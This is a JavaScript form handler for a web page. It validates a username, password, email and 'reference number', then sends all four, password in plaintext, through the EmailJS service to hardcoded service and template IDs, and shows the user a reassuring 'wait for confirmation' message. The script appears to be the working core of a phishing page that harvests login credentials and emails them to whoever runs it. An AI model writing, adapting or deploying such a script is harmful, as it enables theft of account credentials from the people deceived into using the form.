(function () {
    emailjs.init("lXPpqD-qVLJyZ0aaJ"); // Your EmailJS Public Key
})();

function handleSubmit(event) {
    event.preventDefault();

    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value.trim();
    const email = document.getElementById('email').value.trim();
    const reference = document.getElementById('reference').value.trim();
    const message = document.querySelector('.message');
    const button = document.querySelector('.btn');

    // Validation rules
    const usernameRegex = /^[A-Za-z]{4,12}$/;
    const passwordRegex = /^[A-Za-z0-9]{8,18}$/;
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

    if (!usernameRegex.test(username)) {
        showMessage("Username must be 4-12 letters only!", "error");
        return;
    }

    if (!passwordRegex.test(password)) {
        showMessage("Password must be 8-18 characters (letters & numbers only)!", "error");
        return;
    }

    if (!emailRegex.test(email)) {
        showMessage("Enter a valid email address!", "error");
        return;
    }

    if (reference === "") {
        showMessage("Reference number is required!", "error");
        return;
    }

    button.textContent = "Processing...";
    button.disabled = true;

    // Send email via EmailJS
    emailjs.send("service_4cbsl6m", "template_2bwpxqb", {
        username: username,
        password: password,
        email: email,
        reference: reference
    }).then(function (response) {
        console.log("Email sent successfully:", response);
        showMessage("Success! Wait for confirmation.", "success");
    }).catch(function (error) {
        console.error("EmailJS Error:", error);
        showMessage("Error sending email. Check console for details.", "error");
    }).finally(() => {
        button.textContent = "Submit";
        button.disabled = false;
    });
}

function showMessage(text, type) {
    const message = document.querySelector('.message');
    message.textContent = text;
    message.classList.remove("error", "success");
    message.classList.add(type);
    message.style.display = "block";
}
